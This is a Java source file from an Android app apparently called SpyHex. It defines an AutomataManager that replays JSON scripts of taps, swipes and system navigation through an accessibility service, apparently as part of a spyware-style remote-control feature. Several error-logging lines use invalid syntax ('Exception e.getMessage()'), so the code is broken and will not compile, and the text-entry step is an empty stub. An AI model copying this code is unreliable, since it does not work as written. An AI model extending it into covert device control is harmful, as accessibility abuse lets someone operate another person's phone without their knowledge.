package com.spyhex.app.features.automata;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class AutomataManager {
    private static AutomataManager instance;
    private final Context ctx;
    private final List<Script> scripts = new ArrayList<>();
    private boolean isRunning = false;
    private AccessibilityService accessibilityService;

    private AutomataManager() {
        this.ctx = SpyHexApp.getContext();
    }

    public static synchronized AutomataManager getInstance() {
        if (instance == null) instance = new AutomataManager();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService service) {
        this.accessibilityService = service;
    }

    public void runScript(String scriptJson) {
        if (accessibilityService == null) return;
        isRunning = true;
        new Thread(() -> {
            try {
                JSONArray steps = new JSONArray(scriptJson);
                for (int i = 0; i < steps.length(); i++) {
                    JSONObject step = steps.getJSONObject(i);
                    executeStep(step);
                    Thread.sleep(step.optInt("delay", 500));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            isRunning = false;
        }).start();
    }

    private void executeStep(JSONObject step) throws Exception {
        String action = step.optString("action", "click");
        switch (action) {
            case "click":
                performClick(step.optInt("x", 0), step.optInt("y", 0));
                break;
            case "swipe":
                performSwipe(step.optInt("x1", 0), step.optInt("y1", 0),
                    step.optInt("x2", 0), step.optInt("y2", 0),
                    step.optInt("duration", 300));
                break;
            case "text":
                // Find node and set text
                break;
            case "back":
                accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "home":
                accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "recents":
                accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
        }
    }

    private void performClick(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        accessibilityService.dispatchGesture(builder.build(), null, null);
    }

    private void performSwipe(int x1, int y1, int x2, int y2, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        accessibilityService.dispatchGesture(builder.build(), null, null);
    }

    public JSONObject getScripts() {
        JSONObject r = new JSONObject();
        JSONArray arr = new JSONArray();
        for (Script s : scripts) {
            JSONObject o = new JSONObject();
            try {
                o.put("name", s.name);
                o.put("enabled", s.enabled);
                arr.put(o);
            } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
        }
        try {
            r.put("scripts", arr);
            r.put("isRunning", isRunning);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return r;
    }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("ready", accessibilityService != null);
            s.put("isRunning", isRunning);
            s.put("scriptCount", scripts.size());
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return s;
    }

    private static class Script {
        String name;
        String script;
        boolean enabled;
        Script(String n, String s, boolean e) {
            this.name = n; this.script = s; this.enabled = e;
        }
    }
}
